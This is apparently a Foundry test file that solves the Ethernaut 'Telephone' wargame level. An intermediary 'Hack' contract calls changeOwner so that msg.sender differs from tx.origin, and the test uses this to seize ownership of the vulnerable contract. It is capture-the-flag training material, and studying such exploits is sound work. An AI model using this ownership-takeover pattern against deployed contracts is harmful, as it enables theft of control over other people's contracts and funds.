// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Telephone.sol";

contract TelephoneTest is Test{
    
    Telephone instanceAddress;
    address malicious = mkaddr("malicious");

    address random = mkaddr("random");

    function setUp() public {
        instanceAddress = new Telephone();
    }

    function testClaim() public{
        vm.startPrank(malicious);
        Hack telphone = new Hack();
        //check owner before
        instanceAddress.owner();
        telphone.transferTelephoneOwnership(instanceAddress, malicious);
       // instanceAddress.changeOwner(random);//calling this directly will fail because malicious != tx.origin
        //check owner after
        instanceAddress.owner();
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}

contract Hack {
    function transferTelephoneOwnership(Telephone _instanceAddress, address _newOwner) public {
        Telephone tel = Telephone(_instanceAddress);
        tel.changeOwner(_newOwner);
    }
}